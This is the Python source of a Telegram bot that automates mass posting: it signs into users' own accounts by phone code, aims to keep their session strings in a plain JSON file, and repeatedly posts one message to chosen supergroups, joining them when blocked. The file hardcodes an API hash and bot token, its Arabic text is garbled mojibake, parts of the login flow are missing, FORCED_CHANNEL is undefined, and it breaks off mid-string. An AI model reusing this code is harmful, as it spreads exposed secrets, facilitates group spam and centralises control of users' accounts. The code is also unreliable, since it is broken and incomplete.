# Developer: Smith - Mustafa Hussein

# ╪¡┘é┘ê┘é ╪º┘ä┘à╪╖┘ê╪▒: ┘ç╪░╪º ╪º┘ä╪¿┘ê╪¬ ┘à╪¿╪▒┘à╪¼ ┘à┘å ┘é╪¿┘ä ╪│┘à┘è╪½
# ┘ä┘ä╪¬┘ê╪º╪╡┘ä: @ypiu5

import signal
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    CallbackQuery,
    ForceReply,
    InlineKeyboardMarkup as Markup,
    InlineKeyboardButton as Button,
    InputMediaPhoto,
    InputMediaVideo
)
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    UserNotParticipant,
    ChatWriteForbidden,
    BotMethodInvalid
)
import os
from asyncio import create_task, sleep, get_event_loop
from datetime import datetime, timedelta
from pytz import timezone
from typing import Union
import json

# ------------------ ╪Ñ╪╣╪»╪º╪»╪º╪¬ ╪º┘ä╪¿┘ê╪¬ ------------------
import asyncio  # ╪¬╪ú┘â╪» ┘à┘å ┘ê╪¼┘ê╪» ┘ç╪░╪º ╪º┘ä╪│╪╖╪▒ ┘ü┘è ╪ú╪╣┘ä┘ë ╪º┘ä┘à┘ä┘ü

# ... ╪¿╪º┘é┘è ╪º┘ä╪º╪│╪¬┘è╪▒╪º╪»╪º╪¬ ╪º┘ä╪ú╪«╪▒┘ë ...

app = Client(
    "autoPost",
    api_id="29510141",
    api_hash="14c074a5aed49dc7752a9f8d54cf4ad4",
    bot_token="8666985104:AAEZ_NgKD3KaaYyt1WVM4ZgQ8CMZwmZGEqE"
)

# ╪¬╪╣╪»┘è┘ä: ╪Ñ┘å╪┤╪º╪í event loop ╪¼╪»┘è╪» ╪¿╪»┘ä╪º┘ï ┘à┘å get_event_loop()
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

user_states = {}
owner = 8226014028  # ╪º┘è╪»┘è┘â

# ------------------ ╪º┘ä╪ú╪▓╪▒╪º╪▒ ╪º┘ä╪▒╪ª┘è╪│┘è╪⌐ (╪╣╪▒╪º┘é┘è + ╪ú┘è┘é┘ê┘å╪º╪¬) ------------------
homeMarkup = Markup([
    [Button("≡ƒæñ ╪¡╪│╪º╪¿┘è", callback_data="account")],
    [
        Button("≡ƒôï ╪º┘ä╪│┘ê╪¿╪▒╪º╪¬ ╪º┘ä┘à╪╢╪º┘ü╪⌐", callback_data="currentSupers"),
        Button("Γ₧ò ╪Ñ╪╢╪º┘ü╪⌐ ╪│┘ê╪¿╪▒", callback_data="newSuper")
    ],
    [
        Button("ΓÅ▒∩╕Å ┘à╪»╪⌐ ╪º┘ä┘å╪┤╪▒", callback_data="waitTime"),
        Button("≡ƒô¥ ┘â┘ä┘è╪┤╪⌐ ╪º┘ä┘å╪┤╪▒", callback_data="newCaption")
    ],
    [
        Button("ΓÅ╣∩╕Å ╪Ñ┘è┘é╪º┘ü ╪º┘ä┘å╪┤╪▒", callback_data="stopPosting"),
        Button("Γû╢∩╕Å ╪¿╪»╪í ╪º┘ä┘å╪┤╪▒", callback_data="startPosting")
    ],
    [Button("≡ƒ¢í∩╕Å ╪¬╪╣┘ä┘è┘à╪º╪¬ ╪º┘ä╪ú┘à╪º┘å", callback_data="safety")]
])

# ------------------ ╪»┘ê╪º┘ä ┘à╪│╪º╪╣╪»╪⌐ ------------------
def load_users():
    if not os.path.exists("users.json"):
        return {}
    with open("users.json", "r") as f:
        return json.load(f)

def save_users(data):
    with open("users.json", "w") as f:
        json.dump(data, f, indent=2)

def is_subscribed(user_id):
    try:
        member = app.get_chat_member(f"@{FORCED_CHANNEL}", user_id)
        return member.status in ["member", "administrator", "creator"]
    except:
        return False

def get_user_data(user_id):
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {
            "subscription_end": (datetime.now() + timedelta(days=1)).isoformat(),
            "referrals_count": 0,
            "referred_by": None,
            "session": None,
            "groups": [],
            "caption": None,
            "waitTime": 60,
            "posting": False
        }
        save_users(users)
    return users[uid]

def update_user(user_id, data):
    users = load_users()
    uid = str(user_id)
    users[uid].update(data)
    save_users(users)

def has_active_subscription(user_id):
    data = get_user_data(user_id)
    end_str = data.get("subscription_end")
    if not end_str:
        return False
    end = datetime.fromisoformat(end_str)
    return end > datetime.now()

def get_referral_link(user_id):
    return f"https://t.me/{app.me.username}?start=ref_{user_id}"

# ------------------ ╪º┘ä╪¬╪¡┘é┘é ┘à┘å ╪º┘ä╪º╪┤╪¬╪▒╪º┘â ------------------
async def ensure_subscription_and_subscription(message):
    """╪¬╪▒╪¼╪╣ True ╪Ñ╪░╪º ╪º┘ä┘à╪│╪¬╪«╪»┘à ┘à╪┤╪¬╪▒┘â ╪¿╪º┘ä┘é┘å╪º╪⌐ ┘ê╪╣┘å╪»┘ç ╪º╪┤╪¬╪▒╪º┘â ┘ü╪╣╪º┘ä"""
    user_id = message.from_user.id
    # 1- ╪º╪┤╪¬╪▒╪º┘â ╪º┘ä┘é┘å╪º╪⌐
    if not is_subscribed(user_id):
        await message.reply(
            f"- ╪╣╪░╪▒╪º ╪╣╪▓┘è╪▓┘è╪î ┘ä╪º╪▓┘à ╪¬╪┤╪¬╪▒┘â ╪¿╪º┘ä┘é┘å╪º╪⌐ ╪ú┘ê┘ä╪º┘ï ╪╣╪┤╪º┘å ╪¬╪│╪¬╪«╪»┘à ╪º┘ä╪¿┘ê╪¬\n"
            f"- ╪º┘ä┘é┘å╪º╪⌐: @{FORCED_CHANNEL}\n"
            f"- ╪º╪┤╪¬╪▒┘â ╪½┘à ╪ú╪▒╪│┘ä /start\n\n"
            f"╪Ñ╪░╪º ┘â┘å╪¬ ┘à╪┤╪¬╪▒┘â┘ï╪º ╪¿╪º┘ä┘ü╪╣┘ä╪î ╪¬╪ú┘â╪» ┘à┘å ╪ú┘å ╪º┘ä╪¿┘ê╪¬ ┘ä╪»┘è┘ç ╪╡┘ä╪º╪¡┘è╪⌐ '╪╣╪▒╪╢ ╪º┘ä╪ú╪╣╪╢╪º╪í' ┘ü┘è ╪º┘ä┘é┘å╪º╪⌐."
        )
        return False
    # 2- ╪º╪┤╪¬╪▒╪º┘â ╪º┘ä╪¬╪╖╪¿┘è┘é (┘è┘ê┘à ┘à╪¼╪º┘å┘è ╪ú┘ê ╪┤┘ç╪▒ ╪¿╪º┘ä╪Ñ╪¡╪º┘ä╪⌐)
    if not has_active_subscription(user_id):
        data = get_user_data(user_id)
        link = get_referral_link(user_id)
        text = (
            f"╪º┘å╪¬┘ç╪¬ ╪╡┘ä╪º╪¡┘è╪⌐ ╪º╪┤╪¬╪▒╪º┘â┘â ╪º┘ä┘à╪¼╪º┘å┘è.\n\n"
            f"┘ä╪¬╪¡╪╡┘ä ╪╣┘ä┘ë ╪º╪┤╪¬╪▒╪º┘â **╪┤┘ç╪▒ ┘â╪º┘à┘ä**╪î ┘é┘à ╪¿╪»╪╣┘ê╪⌐ 5 ╪ú╪┤╪«╪º╪╡ ╪╣╪¿╪▒ ╪▒╪º╪¿╪╖┘â ╪º┘ä╪«╪º╪╡:\n"
            f"{link}\n\n"
            f"╪╣╪»╪» ╪º┘ä┘à╪»╪╣┘ê┘è┘å ╪¡╪º┘ä┘è┘ï╪º: {data['referrals_count']} / 5\n\n"
            f"┘â┘ä ╪┤╪«╪╡ ┘è╪»╪«┘ä ╪╣╪¿╪▒ ╪▒╪º╪¿╪╖┘â ┘ê┘è╪¿╪»╪ú ╪º┘ä╪¿┘ê╪¬╪î ┘è╪▓╪»╪º╪» ╪º┘ä╪╣╪»╪» ┘ä╪»┘è┘â."
        )
        await message.reply(text)
        return False
    return True

# ------------------ ┘à╪╣╪º┘ä╪¼╪⌐ /start ┘ê╪º┘ä╪Ñ╪¡╪º┘ä╪⌐ ------------------
@app.on_message(filters.command("start") & filters.private)
async def start_command(client, message):
    user_id = message.from_user.id
    # ┘à╪╣╪º┘ä╪¼╪⌐ ╪º┘ä╪Ñ╪¡╪º┘ä╪⌐
    if len(message.command) > 1 and message.command[1].startswith("ref_"):
        referrer_id = int(message.command[1].split("_")[1])
        if referrer_id != user_id:
            users = load_users()
            if str(referrer_id) in users and str(user_id) in users:
                if users[str(user_id)].get("referred_by") is None:
                    users[str(user_id)]["referred_by"] = referrer_id
                    users[str(referrer_id)]["referrals_count"] = users[str(referrer_id)].get("referrals_count", 0) + 1
                    if users[str(referrer_id)]["referrals_count"] >= 5:
                        end = datetime.now() + timedelta(days=30)
                        users[str(referrer_id)]["subscription_end"] = end.isoformat()
                        await app.send_message(
                            referrer_id,
                            f"≡ƒÄë ┘à╪¿╪▒┘ê┘â! ┘ê╪╡┘ä ╪╣╪»╪» ╪º┘ä┘à╪»╪╣┘ê┘è┘å 5╪î ╪¬┘à ╪¬┘à╪»┘è╪» ╪º╪┤╪¬╪▒╪º┘â┘â ┘ä┘à╪»╪⌐ ╪┤┘ç╪▒ ┘â╪º┘à┘ä ╪¡╪¬┘ë {end.strftime('%Y-%m-%d')}."
                        )
                    save_users(users)

    # ╪º┘ä╪¬╪¡┘é┘é ┘à┘å ╪º╪┤╪¬╪▒╪º┘â ╪º┘ä┘é┘å╪º╪⌐
    if not is_subscribed(user_id):
        return await message.reply(
            f"- ╪╣╪░╪▒╪º ╪╣╪▓┘è╪▓┘è╪î ┘ä╪º╪▓┘à ╪¬╪┤╪¬╪▒┘â ╪¿╪º┘ä┘é┘å╪º╪⌐ ╪ú┘ê┘ä╪º┘ï ╪╣╪┤╪º┘å ╪¬╪│╪¬╪«╪»┘à ╪º┘ä╪¿┘ê╪¬\n"
            f"- ╪º┘ä┘é┘å╪º╪⌐: @{FORCED_CHANNEL}\n"
            f"- ╪º╪┤╪¬╪▒┘â ╪½┘à ╪ú╪▒╪│┘ä /start\n\n"
            f"╪Ñ╪░╪º ┘â┘å╪¬ ┘à╪┤╪¬╪▒┘â┘ï╪º ╪¿╪º┘ä┘ü╪╣┘ä╪î ╪¬╪ú┘â╪» ┘à┘å ╪ú┘å ╪º┘ä╪¿┘ê╪¬ ┘ä╪»┘è┘ç ╪╡┘ä╪º╪¡┘è╪⌐ '╪╣╪▒╪╢ ╪º┘ä╪ú╪╣╪╢╪º╪í' ┘ü┘è ╪º┘ä┘é┘å╪º╪⌐."
        )
    # ┘à┘å╪¡ ┘è┘ê┘à ┘à╪¼╪º┘å┘è ┘ä┘ä┘à╪│╪¬╪«╪»┘à ╪º┘ä╪¼╪»┘è╪» ╪ú┘ê ┘ä┘à┘å ╪º┘å╪¬┘ç┘ë ╪º╪┤╪¬╪▒╪º┘â┘ç
    if not has_active_subscription(user_id):
        update_user(user_id, {"subscription_end": (datetime.now() + timedelta(days=1)).isoformat()})
        await message.reply("╪¬┘à ┘à┘å╪¡┘â ┘è┘ê┘à ╪º╪│╪¬╪«╪»╪º┘à ┘à╪¼╪º┘å┘è. ╪º╪│╪¬┘à╪¬╪╣!")
    # ╪╣╪▒╪╢ ╪º┘ä┘é╪º╪ª┘à╪⌐ ╪º┘ä╪▒╪ª┘è╪│┘è╪⌐
    fname = message.from_user.first_name
    caption = f"╪ú┘ç┘ä╪º┘ï ╪¿┘â ╪╣╪▓┘è╪▓┘è [{fname}](tg://settings) ┘ü┘è ╪¿┘ê╪¬ ╪º┘ä┘å╪┤╪▒ ╪º┘ä╪¬┘ä┘é╪º╪ª┘è\n\n- ╪º┘ä╪¿┘ê╪¬ ┘à╪¿╪▒┘à╪¼ ┘à┘å ┘é╪¿┘ä ╪│┘à┘è╪½ - ┘ä┘ä╪¬┘ê╪º╪╡┘ä @ypiu5\n\n- ╪¬┘é╪»╪▒ ╪¬╪│╪¬╪«╪»┘à ╪º┘ä╪¿┘ê╪¬ ╪╣╪┤╪º┘å ╪¬╪▒╪│┘ä ╪▒╪│╪º╪ª┘ä ╪¿╪┤┘â┘ä ╪¬┘ä┘é╪º╪ª┘è ┘ä┘ä╪│┘ê╪¿╪▒╪º╪¬\n- ╪º┘ä╪¬╪¡┘â┘à ╪¿╪º┘ä╪¿┘ê╪¬ ┘à┘å ╪º┘ä╪ú╪▓╪▒╪º╪▒ ╪º┘ä╪¬╪º┘ä┘è╪⌐:"
    await message.reply(caption, reply_markup=homeMarkup, reply_to_message_id=message.id)

# ------------------ ╪º┘ä╪ú╪▓╪▒╪º╪▒ ╪º┘ä╪▒╪ª┘è╪│┘è╪⌐ ------------------
@app.on_callback_query(filters.regex(r"^(toHome)$"))
async def to_home(_, callback: CallbackQuery):
    if not await ensure_subscription_and_subscription(callback.message):
        return
    fname = callback.from_user.first_name
    caption = f"╪ú┘ç┘ä╪º┘ï ╪¿┘â ╪╣╪▓┘è╪▓┘è [{fname}](tg://settings) ┘ü┘è ╪¿┘ê╪¬ ╪º┘ä┘å╪┤╪▒ ╪º┘ä╪¬┘ä┘é╪º╪ª┘è\n\n- ╪º┘ä╪¿┘ê╪¬ ┘à╪¿╪▒┘à╪¼ ┘à┘å ┘é╪¿┘ä ╪│┘à┘è╪½ - ┘ä┘ä╪¬┘ê╪º╪╡┘ä @ypiu5\n\n- ╪¬┘é╪»╪▒ ╪¬╪│╪¬╪«╪»┘à ╪º┘ä╪¿┘ê╪¬ ╪╣╪┤╪º┘å ╪¬╪▒╪│┘ä ╪▒╪│╪º╪ª┘ä ╪¿╪┤┘â┘ä ╪¬┘ä┘é╪º╪ª┘è ┘ä┘ä╪│┘ê╪¿╪▒╪º╪¬\n- ╪º┘ä╪¬╪¡┘â┘à ╪¿╪º┘ä╪¿┘ê╪¬ ┘à┘å ╪º┘ä╪ú╪▓╪▒╪º╪▒ ╪º┘ä╪¬╪º┘ä┘è╪⌐:"
    await callback.message.edit_text(caption, reply_markup=homeMarkup)

@app.on_callback_query(filters.regex(r"^(account)$"))
async def account_menu(_, callback: CallbackQuery):
    if not await ensure_subscription_and_subscription(callback.message):
        return
    user_id = callback.from_user.id
    data = get_user_data(user_id)
    end_date = datetime.fromisoformat(data["subscription_end"]).strftime("%Y-%m-%d")
    caption = (
        f"╪ú┘ç┘ä╪º┘ï ╪¿┘â ┘ü┘è ┘é╪│┘à ╪º┘ä╪¡╪│╪º╪¿\n\n"
        f"≡ƒôà ╪º┘ä╪º╪┤╪¬╪▒╪º┘â ┘è┘å╪¬┘ç┘è: {end_date}\n"
        f"≡ƒæÑ ╪╣╪»╪» ╪º┘ä┘à╪»╪╣┘ê┘è┘å: {data['referrals_count']} / 5\n\n"
        f"≡ƒöù ╪▒╪º╪¿╪╖ ╪º┘ä╪Ñ╪¡╪º┘ä╪⌐ ╪º┘ä╪«╪º╪╡ ╪¿┘â:\n{get_referral_link(user_id)}"
    )
    markup = Markup([
        [Button("- ╪¬╪│╪¼┘è┘ä ╪¡╪│╪º╪¿┘â -", callback_data="login"),
         Button("- ╪¬╪║┘è┘è╪▒ ╪º┘ä╪¡╪│╪º╪¿ -", callback_data="changeAccount")],
        [Button("- ╪º┘ä╪╣┘ê╪»╪⌐ -", callback_data="toHome")]
    ])
    await callback.message.edit_text(caption, reply_markup=markup)

@app.on_callback_query(filters.regex(r"^(login|changeAccount)$"))
async def login(_, callback: CallbackQuery):
    if not await ensure_subscription_and_subscription(callback.message):
        return
    user_id = callback.from_user.id
    if callback.data == "changeAccount" and get_user_data(user_id).get("session") is None:
        return await callback.answer("- ┘à╪º┘â┘ê ╪¡╪│╪º╪¿ ┘à╪│╪¼┘ä.", show_alert=True)
    await callback.message.delete()
    user_states[user_id] = 'waiting_phone'
    await app.send_message(
        user_id,
        "- ╪ú╪▒╪│┘ä ╪▒┘é┘à ┘ç╪º╪¬┘ü┘â:\n\n- ╪¬┘é╪»╪▒ ╪¬╪▒╪│┘ä /cancel ┘ä╪Ñ┘ä╪║╪º╪í ╪º┘ä╪╣┘à┘ä┘è╪⌐.",
        reply_markup=ForceReply(selective=True, placeholder="+9647700000")
    )

async def registration(message: Message):
    user_id = message.from_user.id
    _number = message.text
    lmsg = await message.reply("- ╪¼╪º╪▒┘è ╪¬╪│╪¼┘è┘ä ╪º┘ä╪»╪«┘ê┘ä ╪Ñ┘ä┘ë ╪¡╪│╪º╪¿┘â")
    reMarkup = Markup([
        [Button("- ╪Ñ╪╣╪º╪»╪⌐ ╪º┘ä┘à╪¡╪º┘ê┘ä╪⌐ -", callback_data="login"),
         Button("- ╪º┘ä╪╣┘ê╪»╪⌐ -", callback_data="account")]
    ])
    client = Client("registration", in_memory=True, api_id=app.api_id, api_hash=app.api_hash)
    await client.connect()
    try:
        p_code_hash = await client.send_code(_number)
    except PhoneNumberInvalid:
        await lmsg.edit_text("- ╪▒┘é┘à ╪º┘ä┘ç╪º╪¬┘ü ╪º┘ä┘ä┘è ╪ú╪»╪«┘ä╪¬┘ç ╪«╪╖╪ú", reply_markup=reMarkup)
        del user_states[user_id]
        return
    await lmsg.edit_text("- ╪¬┘à ╪Ñ╪▒╪│╪º┘ä ╪º┘ä┘â┘ê╪» ╪Ñ┘ä┘ë ╪¡╪│╪º╪¿┘â╪î ╪ú╪▒╪│┘ä┘ç ┘ç┘å╪º.", reply_markup=ForceReply(selective=True, placeholder="1 2 3 4 5 6"))
    user_states[user_id] = {'state': 'waiting_code', 'phone': _number, 'phone_code_hash': p_code_hash, 'client': client}

# ------------------ ╪Ñ╪»╪º╪▒╪⌐ ╪º┘ä╪│┘ê╪¿╪▒╪º╪¬ ------------------
@app.on_callback_query(filters.regex(r"^(newSuper)$"))
async def new_super(_, callback: CallbackQuery):
    if not await ensure_subscription_and_subscription(callback.message):
        return
    user_id = callback.from_user.id
    await callback.message.delete()
    user_states[user_id] = 'waiting_super_link'
    await app.send_message(
        user_id,
        "- ╪ú╪▒╪│┘ä ╪▒╪º╪¿╪╖ ╪º┘ä╪│┘ê╪¿╪▒ ╪╣╪┤╪º┘å ╪ú╪╢┘è┘ü┘ç.\n- ┘ä╪º ╪¬┘å╪╢┘à ┘é╪¿┘ä ┘à╪º ╪¬╪¿╪»╪ú ╪º┘ä┘å╪┤╪▒ ┘à╪▒╪⌐ ┘ê╪¡╪»╪⌐ ╪╣┘ä┘ë ╪º┘ä╪ú┘é┘ä.\n- ╪Ñ╪░╪º ┘â╪º┘å ╪º┘ä╪│┘ê╪¿╪▒ ╪«╪º╪╡╪î ╪ú╪▒╪│┘ä ╪º┘ä╪ú┘è╪»┘è ╪º┘ä╪«╪º╪╡ ╪¿┘ç ╪ú┘ê ╪º╪╖┘ä╪╣ ┘à┘å ╪º┘ä╪│┘ê╪¿╪▒ (┘à┘å ╪º┘ä╪¡╪│╪º╪¿ ╪º┘ä┘à╪╢╪º┘ü) ┘ê╪¿╪╣╪»┘è┘å ╪ú╪▒╪│┘ä ╪º┘ä╪▒╪º╪¿╪╖\n\n- ╪¬┘é╪»╪▒ ╪¬╪▒╪│┘ä /cancel ┘ä╪Ñ┘ä╪║╪º╪í ╪º┘ä╪╣┘à┘ä┘è╪⌐.",
        reply_markup=ForceReply(selective=True, placeholder="- ╪▒╪º╪¿╪╖ ╪º┘ä╪│┘ê╪¿╪▒: ")
    )

@app.on_callback_query(filters.regex(r"^(currentSupers)$"))
async def current_supers(_, callback: CallbackQuery):
    if not await ensure_subscription_and_subscription(callback.message):
        return
    user_id = callback.from_user.id
    data = get_user_data(user_id)
    groups = data.get("groups", [])
    if not groups:
        return await callback.answer("- ┘à╪º┘â┘ê ╪│┘ê╪¿╪▒╪º╪¬ ┘à╪╢╪º┘ü╪⌐.", show_alert=True)
    titles = {}
    for group in groups:
        try:
            titles[str(group)] = (await app.get_chat(group)).title
        except:
            continue
    markup = [
        [
            Button(str(group) if titles.get(str(group)) is None else titles[str(group)], callback_data=str(group)),
            Button("≡ƒùæ", callback_data=f"delSuper {group}")
        ] for group in groups
    ]
    markup.append([Button("- ╪º┘ä╪╡┘ü╪¡╪⌐ ╪º┘ä╪▒╪ª┘è╪│┘è╪⌐ -", callback_data="toHome")])
    await callback.message.edit_text("- ┘ç╪º┘è ╪º┘ä╪│┘ê╪¿╪▒╪º╪¬ ╪º┘ä┘ä┘è ┘à╪╢╪º┘ü╪º╪¬ ┘ä┘ä┘å╪┤╪▒ ╪º┘ä╪¬┘ä┘é╪º╪ª┘è:", reply_markup=Markup(markup))

@app.on_callback_query(filters.regex(r"^(delSuper)"))
async def del_super(_, callback: CallbackQuery):
    if not await ensure_subscription_and_subscription(callback.message):
        return
    user_id = callback.from_user.id
    group = int(callback.data.split()[1])
    data = get_user_data(user_id)
    groups = data.get("groups", [])
    if group in groups:
        groups.remove(group)
        update_user(user_id, {"groups": groups})
        await callback.answer("- ╪¬┘à ╪¡╪░┘ü ╪º┘ä╪│┘ê╪¿╪▒ ┘à┘å ╪º┘ä┘é╪º╪ª┘à╪⌐.", show_alert=True)
    titles = {}
    for g in groups:
        try:
            titles[str(g)] = (await app.get_chat(g)).title
        except:
            continue
    markup = [
        [
            Button(str(g) if titles.get(str(g)) is None else titles[str(g)], callback_data=str(g)),
            Button("≡ƒùæ", callback_data=f"delSuper {g}")
        ] for g in groups
    ]
    markup.append([Button("- ╪º┘ä╪╡┘ü╪¡╪⌐ ╪º┘ä╪▒╪ª┘è╪│┘è╪⌐ -", callback_data="toHome")])
    await callback.message.edit_reply_markup(reply_markup=Markup(markup))

# ------------------ ┘â┘ä┘è╪┤╪⌐ ╪º┘ä┘å╪┤╪▒ (╪¬╪»╪╣┘à ╪╡┘ê╪▒ ┘ê┘ü┘è╪»┘è┘ê┘ç╪º╪¬) ------------------
@app.on_callback_query(filters.regex(r"^(newCaption)$"))
async def new_caption(_, callback: CallbackQuery):
    if not await ensure_subscription_and_subscription(callback.message):
        return
    user_id = callback.from_user.id
    await callback.message.delete()
    user_states[user_id] = 'waiting_caption'
    await app.send_message(
        user_id,
        "- ╪ú╪▒╪│┘ä ╪º┘ä┘â┘ä┘è╪┤╪⌐ ╪º┘ä╪¼╪»┘è╪»╪⌐.\n┘è┘à┘â┘å┘â ╪Ñ╪▒╪│╪º┘ä:\n- ┘å╪╡ ╪╣╪º╪»┘è\n- ╪╡┘ê╪▒╪⌐ ┘à╪╣ ╪¬╪╣┘ä┘è┘é (╪¬╪╣┘ä┘è┘é ┘è┘â┘ê┘å ╪º┘ä┘â╪º╪¿╪┤┘å)\n- ┘ü┘è╪»┘è┘ê ┘à╪╣ ╪¬╪╣┘ä┘è┘é\n\n- ╪º╪│╪¬╪«╪»┘à /cancel ┘ä╪Ñ┘ä╪║╪º╪í ╪º┘ä╪╣┘à┘ä┘è╪⌐.",
        reply_markup=ForceReply(selective=True, placeholder="- ╪º┘ä┘â┘ä┘è╪┤╪⌐ ╪º┘ä╪¼╪»┘è╪»╪⌐: ")
    )

# ------------------ ┘à╪»╪⌐ ╪º┘ä┘å╪┤╪▒ ------------------
@app.on_callback_query(filters.regex(r"^(waitTime)$"))
async def wait_time(_, callback: CallbackQuery):
    if not await ensure_subscription_and_subscription(callback.message):
        return
    user_id = callback.from_user.id
    await callback.message.delete()
    user_states[user_id] = 'waiting_waittime'
    await app.send_message(
        user_id,
        "- ╪ú╪▒╪│┘ä ┘à╪»╪⌐ ╪º┘ä╪º┘å╪¬╪╕╪º╪▒ ╪¿┘è┘å ┘â┘ä ╪▒╪│╪º┘ä╪⌐ ┘ê╪ú╪«╪▒┘ë (╪¿╪º┘ä╪½┘ê╪º┘å┘è).\n\n- ╪º╪│╪¬╪«╪»┘à /cancel ┘ä╪Ñ┘ä╪║╪º╪í ╪º┘ä╪╣┘à┘ä┘è╪⌐.",
        reply_markup=ForceReply(selective=True, placeholder="- ╪º┘ä┘à╪»╪⌐: ")
    )

# ------------------ ╪¿╪»╪í ┘ê╪Ñ┘è┘é╪º┘ü ╪º┘ä┘å╪┤╪▒ ------------------
@app.on_callback_query(filters.regex(r"^(startPosting)$"))
async def start_posting(_, callback: CallbackQuery):
    if not await ensure_subscription_and_subscription(callback.message):
        return
    user_id = callback.from_user.id
    data = get_user_data(user_id)
    if data.get("session") is None:
        return await callback.answer("- ┘ä╪º╪▓┘à ╪¬╪╢┘è┘ü ╪¡╪│╪º╪¿ ╪ú┘ê┘ä╪º┘ï.", show_alert=True)
    if not data.get("groups"):
        return await callback.answer("- ┘à╪º┘â┘ê ╪│┘ê╪¿╪▒╪º╪¬ ┘à╪╢╪º┘ü╪⌐.", show_alert=True)
    if data.get("posting"):
        return await callback.answer("- ╪º┘ä┘å╪┤╪▒ ╪º┘ä╪¬┘ä┘é╪º╪ª┘è ┘à┘ü╪╣┘ä ┘à┘å ┘é╪¿┘ä.", show_alert=True)
    update_user(user_id, {"posting": True})
    create_task(posting(user_id))
    markup = Markup([
        [Button("- ╪Ñ┘è┘é╪º┘ü ╪º┘ä┘å╪┤╪▒ -", callback_data="stopPosting"),
         Button("- ╪╣┘ê╪»╪⌐ -", callback_data="toHome")]
    ])
    await callback.message.edit_text("- ╪¿╪»╪ú╪¬ ╪╣┘à┘ä┘è╪⌐ ╪º┘ä┘å╪┤╪▒ ╪º┘ä╪¬┘ä┘é╪º╪ª┘è", reply_markup=markup)

@app.on_callback_query(filters.regex(r"^(stopPosting)$"))
async def stop_posting(_, callback: CallbackQuery):
    if not await ensure_subscription_and_subscription(callback.message):
        return
    user_id = callback.from_user.id
    data = get_user_data(user_id)
    if not data.get("posting"):
        return await callback.answer("- ╪º┘ä┘å╪┤╪▒ ╪º┘ä╪¬┘ä┘é╪º╪ª┘è ┘à┘ê ┘à┘ü╪╣┘ä.", show_alert=True)
    update_user(user_id, {"posting": False})
    markup = Markup([
        [Button("- ╪¿╪»╪í ╪º┘ä┘å╪┤╪▒ -", callback_data="startPosting"),
         Button("- ╪╣┘ê╪»╪⌐ -", callback_data="toHome")]
    ])
    await callback.message.edit_text("- ╪¬┘à ╪Ñ┘è┘é╪º┘ü ╪º┘ä┘å╪┤╪▒ ╪º┘ä╪¬┘ä┘é╪º╪ª┘è", reply_markup=markup)

async def posting(user_id):
    data = get_user_data(user_id)
    if data.get("posting"):
        client = Client(
            str(user_id),
            api_id=app.api_id,
            api_hash=app.api_hash,
            session_string=data["session"]
        )
        await client.start()
    while data.get("posting") and has_active_subscription(user_id):
        wait = data.get("waitTime", 60)
        groups = data.get("groups", [])
        caption_data = data.get("caption")
        if caption_data is None:
            update_user(user_id, {"posting": False})
            await app.send_message(
                user_id,
                "- ╪¬┘à ╪Ñ┘è┘é╪º┘ü ╪º┘ä┘å╪┤╪▒ ╪¿╪│╪¿╪¿ ┘à╪º┘â┘ê ┘â┘ä┘è╪┤╪⌐.",
                reply_markup=Markup([[Button("- ╪Ñ╪╢╪º┘ü╪⌐ ┘â┘ä┘è╪┤╪⌐ -", callback_data="newCaption")]])
            )
            break
        for group in groups:
            if isinstance(group, str) and group.startswith("-"):
                group = int(group)
            try:
                # ╪Ñ╪▒╪│╪º┘ä ╪¡╪│╪¿ ┘å┘ê╪╣ ╪º┘ä┘â┘ä┘è╪┤╪⌐
                if caption_data["type"] == "photo":
                    await client.send_photo(
                        group,
                        caption_data["file_id"],
                        caption=caption_data.get("caption", "")
                    )
                elif caption_data["type"] == "video":
                    await client.send_video(
                        group,
                        caption_data["file_id"],
                        caption=caption_data.get("caption", "")
                    )
                else:  # text
                    await client.send_message(group, caption_data["text"])
            except ChatWriteForbidden:
                await client.join_chat(group)
                try:
                    if caption_data["type"] == "photo":
                        await client.send_photo(group, caption_data["file_id"], caption=caption_data.get("caption", ""))
                    elif caption_data["type"] == "video":
                        await client.send_video(group, caption_data["file_id"], caption=caption_data.get("caption", ""))
                    else:
                        await client.send_message(group, caption_data["text"])
                except Exception as e:
                    await app.send_message(user_id, str(e))
            except Exception:
                chat = await client.join_chat(group)
                try:
                    if caption_data["type"] == "photo":
                        await client.send_photo(chat.id, caption_data["file_id"], caption=caption_data.get("caption", ""))
                    elif caption_data["type"] == "video":
                        await client.send_video(chat.id, caption_data["file_id"], caption=caption_data.get("caption", ""))
                    else:
                        await client.send_message(chat.id, caption_data["text"])
                except Exception as e:
                    await app.send_message(user_id, str(e))
                # ╪¬╪¡╪»┘è╪½ ┘é╪º╪ª┘à╪⌐ ╪º┘ä┘à╪¼┘à┘ê╪╣╪º╪¬
                new_groups = data.get("groups", [])
                new_groups.append(chat.id)
                new_groups.remove(group)
                update_user(user_id, {"groups": new_groups})
        await sleep(wait)
        data = get_user_data(user_id)
    if data.get("posting") and not has_active_subscription(user_id):
        update_user(user_id, {"posting": False})
        await app.send_message(
            user_id,
            "╪º┘å╪¬┘ç┘ë ╪º╪┤╪¬╪▒╪º┘â┘â ╪ú╪½┘å╪º╪í ╪╣┘à┘ä┘è╪⌐ ╪º┘ä┘å╪┤╪▒. ╪¬┘à ╪Ñ┘è┘é╪º┘ü ╪º┘ä┘å╪┤╪▒ ╪º┘ä╪¬┘ä┘é╪º╪ª┘è."
        )
    await client.stop()

# ------------------ ╪¬╪╣┘ä┘è┘à╪º╪¬ ╪º┘ä╪ú┘à╪º┘å ------------------
@app.on_callback_query(filters.regex(r"^(safety)$"))
async def safety_instructions(_, callback: CallbackQuery):
    text = (
        "≡ƒöÆ **╪¬╪╣┘ä┘è┘à╪º╪¬ ╪º┘ä╪ú┘à╪º┘å** ≡ƒöÆ\n\n"
        "1. ┘ä╪º ╪¬╪┤╪º╪▒┘â ┘â┘ê╪» ╪º┘ä╪»╪«┘ê┘ä ╪ú┘ê ┘â┘ä┘à╪⌐ ╪º┘ä┘à╪▒┘ê╪▒ ┘à╪╣ ╪ú┘è ╪┤╪«╪╡.\n"
